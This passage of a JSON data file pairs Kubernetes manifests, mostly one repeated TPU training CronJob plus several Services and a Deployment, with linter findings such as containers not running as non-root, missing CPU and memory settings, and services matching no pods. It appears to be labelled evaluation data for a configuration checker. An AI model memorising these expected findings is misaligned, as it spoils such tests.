    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "1867",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "1868",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "1869",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "1870",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"train\" has cpu request 0"
  },
  {
    "id": "1871",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "1872",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "1873",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "1874",
    "manifest_path": "data/manifests/the_stack_sample/sample_0422.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    service.alpha.openshift.io/serving-cert-secret-name: cluster-monitoring-operator-tls\n  labels:\n    app: cluster-monitoring-operator\n  name: cluster-monitoring-operator\n  namespace: openshift-monitoring\nspec:\n  clusterIP: None\n  ports:\n  - name: https\n    port: 8443\n    targetPort: https\n  selector:\n    app: cluster-monitoring-operator\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:cluster-monitoring-operator])"
  },
  {
    "id": "1875",
    "manifest_path": "data/manifests/the_stack_sample/sample_0423.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: vault\nspec:\n  selector:\n    app: vault\n  type: NodePort\n  ports:\n  - name: http\n    port: 8200\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:vault])"
  },
  {
    "id": "1876",
    "manifest_path": "data/manifests/the_stack_sample/sample_0424.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nfs\nspec:\n  ports:\n  - name: nfs\n    port: 2049\n  - name: mountd\n    port: 20048\n  - name: rpcbind\n    port: 111\n  selector:\n    app: nfs\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nfs])"
  },
  {
    "id": "1877",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: 